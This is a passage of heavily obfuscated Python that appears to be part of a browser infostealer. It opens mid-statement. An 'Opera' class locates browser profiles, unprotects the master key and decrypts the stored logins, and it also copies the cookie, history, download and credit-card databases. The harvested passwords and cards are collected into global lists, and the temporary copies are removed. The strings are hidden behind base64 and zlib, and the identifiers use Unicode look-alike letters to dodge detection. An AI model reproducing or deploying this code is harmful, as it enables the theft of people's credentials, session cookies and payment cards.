__𝗶𝙢𝘱𝙤𝙧𝘁__('base64').b64decode(__𝙞𝙢𝗽𝘰𝘳𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]):
                continue
            𝘤𝘢𝘳𝘥_𝘯𝙪𝙢𝗯𝙚𝙧 = 𝘴𝙚𝗹𝘧.decrypt_password(𝘳𝗼𝘄[𝙞𝘯𝘵.from_bytes(𝗺𝘢𝙥(lambda O, i: 744 - (𝙞𝘯𝙩(𝘖) + 𝗶), 𝗺𝙖𝗽(__𝘪𝗺𝙥𝘰𝗿𝘁__('base64').b64decode(__𝗶𝙢𝗽𝘰𝗿𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝘪𝙥(*[𝗶𝘁𝙚𝙧(__𝗶𝘮𝗽𝘰𝙧𝙩__('base64').b64decode(__𝗶𝙢𝘱𝗼𝙧𝘁__('zlib').decompress(b'x\xda\xf3\xab\n\xac\x00\x00\x03\xc4\x01\x92')).decode())] * 3)), 𝗿𝙖𝗻𝗴𝘦(1)), __𝘪𝙢𝗽𝙤𝙧𝙩__('base64').b64decode(__𝘪𝙢𝗽𝘰𝘳𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝙨𝗲𝘭𝗳.master_key)
            __𝗖𝘼𝗥𝘋𝙎__.append(𝗧𝙮𝙥𝘦𝙨.CreditCard(𝘳𝙤𝘸[𝗶𝗻𝘵.from_bytes(𝙢𝙖𝙥(lambda O, i: 771 - (𝘪𝗻𝘁(𝘖) + 𝙞), 𝘮𝗮𝘱(__𝘪𝗺𝗽𝗼𝘳𝙩__('base64').b64decode(__𝗶𝗺𝗽𝗼𝗿𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝗶𝘱(*[𝘪𝘵𝘦𝗿(__𝙞𝘮𝘱𝗼𝙧𝘁__('base64').b64decode(__𝗶𝗺𝘱𝘰𝗿𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝙧𝙖𝘯𝙜𝙚(0)), __𝘪𝗺𝗽𝗼𝗿𝘵__('base64').b64decode(__𝗶𝗺𝙥𝗼𝗿𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝙧𝘰𝙬[𝗶𝙣𝘵.from_bytes(𝘮𝗮𝗽(lambda O, i: 999 - (𝗶𝘯𝘁(𝙊) + 𝗶), 𝗺𝙖𝗽(__𝘪𝙢𝙥𝙤𝙧𝘵__('base64').b64decode(__𝙞𝘮𝙥𝗼𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝘪𝙥(*[𝘪𝘵𝗲𝘳(__𝗶𝙢𝘱𝘰𝙧𝙩__('base64').b64decode(__𝙞𝗺𝙥𝗼𝗿𝘁__('zlib').decompress(b'x\xda\xf3\x0f\xc96\x01\x00\x03F\x01C')).decode())] * 3)), 𝗿𝗮𝘯𝘨𝘦(1)), __𝗶𝗺𝘱𝗼𝙧𝘁__('base64').b64decode(__𝗶𝘮𝙥𝘰𝘳𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝙧𝙤𝙬[𝗶𝘯𝘁.from_bytes(𝙢𝙖𝗽(lambda O, i: 680 - (𝘪𝗻𝘁(𝗢) + 𝘪), 𝙢𝙖𝙥(__𝘪𝘮𝗽𝗼𝗿𝙩__('base64').b64decode(__𝗶𝙢𝘱𝗼𝘳𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝘪𝗽(*[𝗶𝘁𝙚𝗿(__𝙞𝗺𝘱𝗼𝙧𝘵__('base64').b64decode(__𝙞𝙢𝘱𝘰𝙧𝘵__('zlib').decompress(b'x\xda\xf3\xcbJ6\x01\x00\x03t\x01P')).decode())] * 3)), 𝗿𝙖𝙣𝘨𝙚(1)), __𝗶𝘮𝙥𝙤𝗿𝘁__('base64').b64decode(__𝙞𝗺𝗽𝙤𝙧𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝗰𝘢𝘳𝘥_𝙣𝘶𝙢𝗯𝗲𝙧, 𝗿𝗼𝙬[𝘪𝗻𝙩.from_bytes(𝗺𝘢𝗽(lambda O, i: 855 - (𝗶𝘯𝙩(𝗢) + 𝘪), 𝘮𝗮𝗽(__𝘪𝗺𝘱𝗼𝘳𝘁__('base64').b64decode(__𝘪𝘮𝘱𝙤𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝙞𝘱(*[𝙞𝘁𝗲𝗿(__𝘪𝙢𝙥𝗼𝙧𝙩__('base64').b64decode(__𝙞𝗺𝘱𝙤𝙧𝙩__('zlib').decompress(b'x\xda\xf3w\t\xad\x00\x00\x03.\x01a')).decode())] * 3)), 𝙧𝙖𝙣𝙜𝘦(1)), __𝙞𝘮𝘱𝗼𝘳𝘵__('base64').b64decode(__𝙞𝙢𝙥𝙤𝙧𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]))
        𝗰𝙤𝙣𝗻.close()
        𝘰𝘴.remove(__𝘪𝘮𝗽𝘰𝘳𝘁__('base64').b64decode(__𝗶𝘮𝘱𝗼𝘳𝘁__('zlib').decompress(b'x\xda\x8b4r\xab\x8c\xf2\xf0K\x8br\xf7\xb4\x05\x00\x19\x01\x03\xc8')).decode())

class Opera:

    def __init__(self):
        𝘴𝗲𝘵𝙖𝘁𝘵𝙧(𝙨𝙚𝗹𝘧, 'roaming', 𝗼𝙨.getenv(__𝘪𝗺𝘱𝘰𝙧𝘵__('base64').b64decode(__𝘪𝙢𝙥𝘰𝗿𝙩__('zlib').decompress(b'x\xda\x0b\x0cs\n\x0cru\x0b\r\x0c\xb4\xb5\x05\x00\x17\xa5\x03\x89')).decode()))
        𝘴𝗲𝘵𝙖𝘁𝘵𝗿(𝘴𝗲𝘭𝙛, 'paths', {__𝘪𝘮𝙥𝙤𝘳𝘁__('base64').b64decode(__𝗶𝘮𝗽𝗼𝙧𝙩__('zlib').decompress(b'x\xdaK2v\xcaI\xceu\xcbKu\xb4\xb5\x05\x00\x1a \x03\xe8')).decode(): 𝘀𝗲𝗹𝘧.roaming + __𝗶𝗺𝘱𝗼𝘳𝙩__('base64').b64decode(__𝘪𝘮𝘱𝘰𝗿𝘁__('zlib').decompress(b'x\xda\x8bp\xb5,\x8f\x8a\xf0\xca\xf0t\xf3+\x8b\xca\x0b2\x8e\x8c\xf0\xca\x89\x80\x89\xb9\xa6D\x02\xc5\r"\xc3\xbd\x8a\xa3\x02mm\x01H\x08\x0eT')).decode(), __𝘪𝗺𝙥𝘰𝗿𝘵__('base64').b64decode(__𝗶𝙢𝗽𝗼𝘳𝘵__('zlib').decompress(b'x\xdaK2v\xcaI\xceu\xb5\x05\x00\x0b\xbf\x02\x96')).decode(): 𝘴𝘦𝙡𝘧.roaming + __𝘪𝙢𝘱𝘰𝙧𝘁__('base64').b64decode(__𝙞𝙢𝙥𝙤𝘳𝙩__('zlib').decompress(b'x\xda\x8bp\xb5,\x8f\x8a\xf0\xca\xf0t\xf3+\x8b\xca\x0b2\x8e\x8c\xf0\xca\x89@\x88\x19D\x86{\x15G\x05\xda\xda\x02\x00\x0f\xc8\r\t')).decode()})
        for (_, 𝙥𝗮𝙩𝗵) in 𝙨𝗲𝙡𝗳.paths.items():
            if not 𝙤𝙨.path.exists(𝗽𝙖𝘵𝙝):
                continue
            𝘴𝙚𝙩𝙖𝘵𝘁𝗿(𝘴𝙚𝘭𝗳, 'master_key', 𝘴𝙚𝘭𝙛.get_master_key(__𝗶𝙢𝙥𝘰𝗿𝘵__('base64').b64decode(__𝙞𝘮𝘱𝙤𝙧𝘁__('zlib').decompress(b'x\xdaK56L\x0eq\xb7\xcc\x8a\x0c/O\x0f5\x0e\xcaHq\x0f\xb5\x05\x00C*\x06x')).decode().format(𝘱𝗮𝘁𝙝)))
            if not 𝘴𝘦𝗹𝗳.master_key:
                continue
            𝘰𝗽𝘦𝙧𝗮𝘵𝙞𝗼𝗻𝘀 = [𝘀𝗲𝗹𝘧.get_login_data, 𝙨𝘦𝗹𝙛.get_cookies, 𝘀𝘦𝙡𝘧.get_web_history, 𝙨𝙚𝘭𝙛.get_downloads, 𝙨𝙚𝘭𝗳.get_credit_cards]
            for 𝘰𝙥𝙚𝗿𝗮𝙩𝙞𝘰𝘯 in 𝘰𝘱𝘦𝘳𝙖𝙩𝙞𝘰𝘯𝘀:
                try:
                    𝙤𝙥𝘦𝗿𝗮𝘁𝙞𝙤𝙣(𝙥𝗮𝘁𝘩)
                except 𝙀𝘹𝗰𝗲𝗽𝘁𝘪𝘰𝘯 as e:
                    pass

    def get_master_key(self, path):
        if not 𝙤𝘴.path.exists(𝙥𝘢𝙩𝘩):
            return
        if __𝙞𝘮𝘱𝗼𝗿𝘁__('base64').b64decode(__𝘪𝗺𝗽𝘰𝙧𝘁__('zlib').decompress(b'x\xdaK2\xf6K\x8b4\xf62M\xf6\x08\xb4\x05\x00\x17\xac\x03\x8e')).decode() not in 𝙤𝙥𝙚𝘯(𝙥𝙖𝙩𝗵, __𝘪𝘮𝗽𝗼𝗿𝙩__('base64').b64decode(__𝗶𝗺𝙥𝙤𝙧𝙩__('zlib').decompress(b'x\xdaKN\xb7\xb5\x05\x00\x03|\x01E')).decode(), encoding=__𝘪𝗺𝘱𝗼𝘳𝘁__('base64').b64decode(__𝗶𝙢𝙥𝙤𝘳𝘵__('zlib').decompress(b'x\xdaK\x89\x08\xca\xf5\tI\xb7\x05\x00\x0c\xd4\x02\xc0')).decode()).read():
            return
        with 𝘰𝗽𝗲𝙣(𝙥𝘢𝙩𝘩, __𝙞𝗺𝗽𝙤𝘳𝙩__('base64').b64decode(__𝘪𝗺𝙥𝘰𝙧𝘁__('zlib').decompress(b'x\xdaKN\xb7\xb5\x05\x00\x03|\x01E')).decode(), encoding=__𝗶𝗺𝙥𝘰𝙧𝘁__('base64').b64decode(__𝗶𝙢𝘱𝙤𝘳𝙩__('zlib').decompress(b'x\xdaK\x89\x08\xca\xf5\tI\xb7\x05\x00\x0c\xd4\x02\xc0')).decode()) as 𝙛:
            𝘤 = 𝘧.read()
        𝘭𝙤𝗰𝙖𝘭_𝘴𝘁𝗮𝙩𝗲 = 𝙟𝘴𝙤𝙣.loads(𝙘)
        𝘮𝘢𝘀𝘁𝗲𝘳_𝙠𝙚𝘺 = 𝗯𝘢𝘴𝗲64.b64decode(𝗹𝗼𝗰𝙖𝙡_𝙨𝙩𝙖𝙩𝘦[__𝘪𝙢𝘱𝙤𝘳𝙩__('base64').b64decode(__𝙞𝙢𝙥𝙤𝘳𝙩__('zlib').decompress(b'x\xdaK2\xf6K\x8b4\xf62M\xf6\x08\xb4\x05\x00\x17\xac\x03\x8e')).decode()][__𝘪𝙢𝗽𝗼𝘳𝘁__('base64').b64decode(__𝙞𝘮𝗽𝘰𝘳𝘁__('zlib').decompress(b'x\xda\x8b\n7\xcdJ\xce\xcb)Oq\x0f\xcb\x8e0*\xc9I\r\xb4\xb5\x05\x00K\xf6\x07\x0b')).decode()])
        𝗺𝗮𝘀𝘁𝙚𝙧_𝗸𝘦𝘆 = 𝘮𝘢𝘴𝘁𝙚𝗿_𝗸𝘦𝘆[𝘪𝘯𝘵.from_bytes(𝗺𝗮𝘱(lambda O, i: 984 - (𝙞𝙣𝙩(𝗢) + 𝘪), 𝗺𝗮𝘱(__𝙞𝘮𝗽𝘰𝘳𝘁__('base64').b64decode(__𝙞𝙢𝗽𝘰𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝘪𝘱(*[𝗶𝘵𝙚𝙧(__𝗶𝗺𝗽𝘰𝘳𝘁__('base64').b64decode(__𝘪𝘮𝙥𝙤𝘳𝙩__('zlib').decompress(b'x\xda\xf3\x0fI6\x05\x00\x037\x01<')).decode())] * 3)), 𝗿𝘢𝘯𝗴𝘦(1)), __𝘪𝗺𝘱𝘰𝗿𝘁__('base64').b64decode(__𝘪𝗺𝘱𝙤𝗿𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False):]
        𝗺𝘢𝘀𝘵𝙚𝘳_𝘬𝗲𝘺 = 𝗖𝗿𝘺𝙥𝙩𝙐𝘯𝗽𝘳𝘰𝙩𝗲𝙘𝙩𝗗𝗮𝘁𝗮(𝗺𝘢𝘴𝘵𝙚𝗿_𝗸𝗲𝘺, None, None, None, 𝗶𝙣𝙩.from_bytes(𝗺𝘢𝗽(lambda O, i: 509 - (𝘪𝘯𝙩(𝙊) + 𝘪), 𝗺𝗮𝙥(__𝙞𝗺𝙥𝙤𝙧𝘵__('base64').b64decode(__𝗶𝙢𝗽𝘰𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝗶𝙥(*[𝗶𝘵𝘦𝗿(__𝗶𝗺𝙥𝗼𝗿𝙩__('base64').b64decode(__𝙞𝘮𝘱𝘰𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝙧𝙖𝗻𝗴𝘦(0)), __𝘪𝗺𝘱𝗼𝘳𝘵__('base64').b64decode(__𝗶𝗺𝗽𝗼𝙧𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False))[𝙞𝙣𝙩.from_bytes(𝘮𝗮𝘱(lambda O, i: 641 - (𝗶𝗻𝘵(𝘖) + 𝗶), 𝗺𝙖𝘱(__𝘪𝙢𝘱𝙤𝗿𝘵__('base64').b64decode(__𝘪𝗺𝗽𝗼𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝘪𝗽(*[𝙞𝙩𝗲𝗿(__𝙞𝙢𝗽𝘰𝙧𝘁__('base64').b64decode(__𝗶𝘮𝙥𝙤𝙧𝙩__('zlib').decompress(b'x\xda\xf3\xcb\n,\x07\x00\x03\x93\x01\x81')).decode())] * 3)), 𝙧𝘢𝙣𝗴𝘦(1)), __𝙞𝘮𝗽𝗼𝙧𝘁__('base64').b64decode(__𝗶𝗺𝗽𝘰𝗿𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]
        return 𝗺𝙖𝙨𝘁𝙚𝘳_𝘬𝘦𝘺

    def decrypt_password(self, buff, master_key):
        𝗶𝘷 = 𝘣𝘂𝗳𝙛[𝗶𝘯𝘁.from_bytes(𝙢𝗮𝗽(lambda O, i: 560 - (𝗶𝘯𝘁(𝗢) + 𝙞), 𝙢𝙖𝙥(__𝘪𝙢𝘱𝙤𝙧𝘁__('base64').b64decode(__𝙞𝘮𝙥𝗼𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝙞𝙥(*[𝘪𝘁𝘦𝗿(__𝗶𝘮𝗽𝙤𝘳𝘵__('base64').b64decode(__𝙞𝗺𝘱𝘰𝗿𝘵__('zlib').decompress(b'x\xda\xf3\x0b\t5\x06\x00\x03\x15\x01+')).decode())] * 3)), 𝗿𝙖𝙣𝘨𝗲(1)), __𝘪𝘮𝘱𝘰𝙧𝙩__('base64').b64decode(__𝙞𝙢𝙥𝘰𝙧𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False):𝘪𝙣𝘵.from_bytes(𝗺𝗮𝘱(lambda O, i: 379 - (𝘪𝙣𝙩(𝘖) + 𝙞), 𝙢𝙖𝙥(__𝗶𝙢𝙥𝙤𝗿𝘁__('base64').b64decode(__𝙞𝙢𝗽𝗼𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝙞𝘱(*[𝗶𝘁𝙚𝙧(__𝘪𝘮𝙥𝗼𝘳𝘁__('base64').b64decode(__𝗶𝘮𝙥𝗼𝗿𝘁__('zlib').decompress(b'x\xda\xf3\xad\x8a4\x00\x00\x03\x88\x01Q')).decode())] * 3)), 𝙧𝙖𝗻𝗴𝗲(1)), __𝗶𝘮𝘱𝙤𝘳𝘁__('base64').b64decode(__𝗶𝗺𝗽𝗼𝘳𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]
        𝙥𝗮𝘆𝘭𝘰𝘢𝙙 = 𝗯𝘂𝗳𝙛[𝙞𝙣𝘵.from_bytes(𝘮𝘢𝗽(lambda O, i: 684 - (𝘪𝘯𝘁(𝘖) + 𝗶), 𝘮𝙖𝙥(__𝘪𝘮𝗽𝙤𝙧𝘁__('base64').b64decode(__𝗶𝙢𝙥𝘰𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝗶𝗽(*[𝗶𝘵𝘦𝘳(__𝗶𝘮𝗽𝙤𝗿𝙩__('base64').b64decode(__𝙞𝙢𝗽𝙤𝙧𝙩__('zlib').decompress(b'x\xda\xf3\xcb\x8a4\x05\x00\x03a\x01G')).decode())] * 3)), 𝙧𝗮𝘯𝘨𝗲(1)), __𝗶𝘮𝘱𝗼𝘳𝘁__('base64').b64decode(__𝘪𝙢𝘱𝙤𝙧𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False):]
        𝗰𝙞𝙥𝘩𝙚𝘳 = 𝘈𝙀𝗦.new(𝙢𝗮𝙨𝙩𝗲𝘳_𝗸𝙚𝙮, 𝘼𝗘𝘚.MODE_GCM, 𝘪𝘃)
        𝙙𝙚𝗰𝗿𝘆𝘱𝘵𝗲𝙙_𝙥𝗮𝘴𝘴 = 𝗰𝘪𝗽𝘩𝗲𝗿.decrypt(𝗽𝗮𝙮𝙡𝗼𝙖𝘥)
        𝙙𝙚𝘤𝙧𝘆𝗽𝘁𝗲𝘥_𝗽𝗮𝙨𝘴 = 𝗱𝗲𝘤𝘳𝘆𝙥𝙩𝗲𝗱_𝙥𝗮𝘀𝙨[:-𝙞𝘯𝘁.from_bytes(𝙢𝙖𝘱(lambda O, i: 685 - (𝘪𝘯𝘁(𝙊) + 𝗶), 𝗺𝘢𝙥(__𝗶𝙢𝗽𝙤𝘳𝘵__('base64').b64decode(__𝙞𝗺𝗽𝘰𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝗶𝗽(*[𝘪𝙩𝗲𝙧(__𝙞𝘮𝗽𝘰𝙧𝙩__('base64').b64decode(__𝙞𝗺𝗽𝘰𝙧𝘵__('zlib').decompress(b'x\xda\xf3\xcb\x8a4\x05\x00\x03a\x01G')).decode())] * 3)), 𝗿𝙖𝗻𝙜𝘦(1)), __𝘪𝘮𝗽𝗼𝘳𝘁__('base64').b64decode(__𝙞𝘮𝗽𝙤𝘳𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)].decode()
        return 𝙙𝙚𝗰𝘳𝘺𝙥𝘁𝗲𝙙_𝘱𝘢𝘴𝘴

    def get_login_data(self, path):
        𝗹𝘰𝗴𝗶𝗻_𝘥𝙗 = __𝗶𝗺𝙥𝗼𝙧𝙩__('base64').b64decode(__𝘪𝙢𝗽𝙤𝘳𝘵__('zlib').decompress(b'x\xdaK56L\x0eq\xb7\xccK\x0c7I\x0frw3\x88\x0c\xb4\xb5\x05\x00?\xf6\x05\xf5')).decode().format(𝘱𝘢𝘵𝘩)
        if not 𝙤𝘴.path.exists(𝙡𝗼𝗴𝘪𝗻_𝗱𝗯):
            return
        𝘴𝗵𝘶𝘁𝘪𝘭.copy(𝗹𝙤𝘨𝘪𝗻_𝗱𝗯, __𝘪𝘮𝗽𝘰𝗿𝙩__('base64').b64decode(__𝘪𝗺𝗽𝗼𝙧𝙩__('zlib').decompress(b'x\xdaKr\xb7\xccK\x0c7M\x8br\xf7\xb4\x05\x00\x19z\x03\xcb')).decode())
        𝘤𝘰𝘯𝙣 = 𝘀𝗾𝗹𝙞𝘁𝗲3.connect(__𝗶𝘮𝗽𝘰𝘳𝙩__('base64').b64decode(__𝙞𝗺𝗽𝗼𝙧𝙩__('zlib').decompress(b'x\xdaKr\xb7\xccK\x0c7M\x8br\xf7\xb4\x05\x00\x19z\x03\xcb')).decode())
        𝘤𝘶𝘳𝘴𝘰𝙧 = 𝙘𝗼𝘯𝗻.cursor()
        𝗰𝘶𝘳𝘴𝗼𝘳.execute(__𝗶𝗺𝙥𝙤𝙧𝘵__('base64').b64decode(__𝙞𝙢𝗽𝘰𝙧𝘵__('zlib').decompress(b'x\xda\x0b5\x08\xf3\r\n\xf5\x0b\xf5t\xb7\xacL\x0cO)H\xca\xb14L\xce-/\xf6\xf4\x08\xab\x8a\x8a\xf0*\x8d\x0c7\xcc\x890\x8e\xcaH\xf2\x08\xcb\xf1qv*\x8f\x8c\xf0\xabJ1\xb2\xac\x8cr\xb34\x8a\x0c\xaf0\x8c\nvr\x0f\xcd\xb6\xf4\xf3t\xaf(\x8b2\xca)M.\xb7\xb5\x05\x00\xb0\n\x1c4')).decode())
        for 𝗿𝗼𝘸 in 𝘤𝙪𝗿𝘀𝙤𝘳.fetchall():
            if not 𝗿𝗼𝘄[𝙞𝙣𝘵.from_bytes(𝙢𝙖𝗽(lambda O, i: 389 - (𝙞𝘯𝘵(𝘖) + 𝗶), 𝗺𝙖𝙥(__𝗶𝗺𝙥𝗼𝗿𝘵__('base64').b64decode(__𝘪𝙢𝙥𝘰𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝗶𝗽(*[𝙞𝘵𝗲𝙧(__𝘪𝗺𝙥𝙤𝙧𝙩__('base64').b64decode(__𝘪𝙢𝘱𝙤𝗿𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝙧𝙖𝗻𝙜𝗲(0)), __𝗶𝘮𝘱𝙤𝙧𝘁__('base64').b64decode(__𝙞𝙢𝘱𝗼𝗿𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] or not 𝙧𝙤𝙬[𝙞𝙣𝘁.from_bytes(𝙢𝘢𝙥(lambda O, i: 857 - (𝗶𝗻𝘵(𝙊) + 𝙞), 𝗺𝗮𝙥(__𝘪𝘮𝘱𝙤𝗿𝘁__('base64').b64decode(__𝙞𝘮𝘱𝗼𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝙞𝘱(*[𝘪𝘁𝙚𝗿(__𝘪𝗺𝙥𝙤𝙧𝘵__('base64').b64decode(__𝙞𝗺𝘱𝗼𝙧𝘁__('zlib').decompress(b'x\xda\xf3w\t5\x02\x00\x02\xe8\x01\x1b')).decode())] * 3)), 𝙧𝗮𝘯𝙜𝘦(1)), __𝙞𝗺𝗽𝙤𝗿𝙩__('base64').b64decode(__𝗶𝘮𝗽𝘰𝘳𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] or (not 𝘳𝗼𝘸[𝙞𝗻𝘁.from_bytes(𝗺𝙖𝙥(lambda O, i: 887 - (𝗶𝙣𝘁(𝗢) + 𝗶), 𝗺𝗮𝙥(__𝗶𝘮𝘱𝗼𝙧𝙩__('base64').b64decode(__𝙞𝘮𝗽𝙤𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝙞𝗽(*[𝗶𝘵𝙚𝗿(__𝗶𝘮𝘱𝙤𝘳𝙩__('base64').b64decode(__𝗶𝘮𝘱𝗼𝙧𝘵__('zlib').decompress(b'x\xda\xf3wI7\x04\x00\x03\x0b\x01,')).decode())] * 3)), 𝙧𝗮𝘯𝘨𝙚(1)), __𝗶𝘮𝘱𝙤𝙧𝘵__('base64').b64decode(__𝙞𝗺𝘱𝗼𝙧𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]):
                continue
            𝗽𝘢𝙨𝘴𝘸𝙤𝗿𝙙 = 𝘴𝘦𝘭𝙛.decrypt_password(𝗿𝗼𝘸[𝙞𝗻𝘵.from_bytes(𝙢𝙖𝘱(lambda O, i: 878 - (𝗶𝗻𝘵(𝘖) + 𝗶), 𝘮𝘢𝘱(__𝘪𝘮𝘱𝘰𝗿𝘁__('base64').b64decode(__𝗶𝙢𝙥𝗼𝘳𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝙞𝘱(*[𝗶𝘵𝙚𝙧(__𝙞𝘮𝗽𝙤𝙧𝙩__('base64').b64decode(__𝗶𝙢𝘱𝗼𝙧𝙩__('zlib').decompress(b'x\xda\xf3wI6\x02\x00\x03\x04\x01)')).decode())] * 3)), 𝙧𝗮𝙣𝘨𝙚(1)), __𝘪𝙢𝘱𝘰𝘳𝙩__('base64').b64decode(__𝗶𝗺𝘱𝘰𝘳𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝘀𝗲𝗹𝙛.master_key)
            __𝗟𝙊𝗚𝘐𝙉𝙎__.append(𝙏𝘆𝘱𝗲𝘴.Login(𝙧𝙤𝙬[𝙞𝙣𝘁.from_bytes(𝘮𝗮𝗽(lambda O, i: 448 - (𝙞𝙣𝙩(𝗢) + 𝘪), 𝗺𝙖𝙥(__𝙞𝘮𝗽𝗼𝙧𝙩__('base64').b64decode(__𝘪𝗺𝗽𝙤𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝘪𝙥(*[𝘪𝘵𝘦𝗿(__𝗶𝘮𝗽𝘰𝙧𝘵__('base64').b64decode(__𝙞𝙢𝘱𝘰𝘳𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝘳𝗮𝙣𝗴𝗲(0)), __𝙞𝗺𝗽𝙤𝘳𝙩__('base64').b64decode(__𝙞𝙢𝘱𝙤𝙧𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝘳𝙤𝙬[𝙞𝗻𝙩.from_bytes(𝙢𝘢𝗽(lambda O, i: 886 - (𝘪𝙣𝙩(𝙊) + 𝗶), 𝗺𝗮𝗽(__𝘪𝙢𝗽𝙤𝙧𝘁__('base64').b64decode(__𝗶𝙢𝙥𝘰𝗿𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝗶𝗽(*[𝗶𝘁𝗲𝗿(__𝗶𝙢𝗽𝙤𝘳𝘁__('base64').b64decode(__𝙞𝙢𝗽𝘰𝘳𝘁__('zlib').decompress(b'x\xda\xf3wI7\x04\x00\x03\x0b\x01,')).decode())] * 3)), 𝘳𝗮𝙣𝗴𝗲(1)), __𝗶𝘮𝗽𝙤𝙧𝘁__('base64').b64decode(__𝗶𝙢𝘱𝘰𝗿𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝘱𝙖𝘀𝙨𝙬𝘰𝘳𝙙))
        𝗰𝘂𝘳𝙨𝗼𝗿.close()
        𝘤𝘰𝗻𝗻.close()
        𝗼𝘴.remove(__𝗶𝗺𝙥𝘰𝗿𝘁__('base64').b64decode(__𝗶𝙢𝗽𝙤𝙧𝙩__('zlib').decompress(b'x\xdaKr\xb7\xccK\x0c7M\x8br\xf7\xb4\x05\x00\x19z\x03\xcb')).decode())

    def get_cookies(self, path):
        𝙘𝘰𝙤𝗸𝙞𝙚𝙨_𝙙𝗯 = __𝗶𝘮𝘱𝗼𝗿𝘁__('base64').b64decode(__𝗶𝘮𝗽𝙤𝘳𝘁__('zlib').decompress(b'x\xdaK56L\x0e\xc9\r3H1\xb2\xacL4\xacpI2\xb2,J\x0c\x0f\xab\x02\x00^6\x07\xd1')).decode().format(𝗽𝘢𝙩𝙝)
        if not 𝙤𝘴.path.exists(𝘤𝙤𝙤𝘬𝙞𝗲𝘀_𝘥𝗯):
            return
        𝙨𝗵𝙪𝘁𝘪𝘭.copy(𝙘𝙤𝙤𝙠𝙞𝗲𝘀_𝘥𝗯, __𝙞𝗺𝘱𝘰𝗿𝘁__('base64').b64decode(__𝘪𝗺𝙥𝗼𝘳𝙩__('zlib').decompress(b'x\xda\x8b4\xb2,K4\xca\xc9I6\xb4\xcc\x8eL\xb7\xb5\x05\x00+\x8c\x05\x18')).decode())
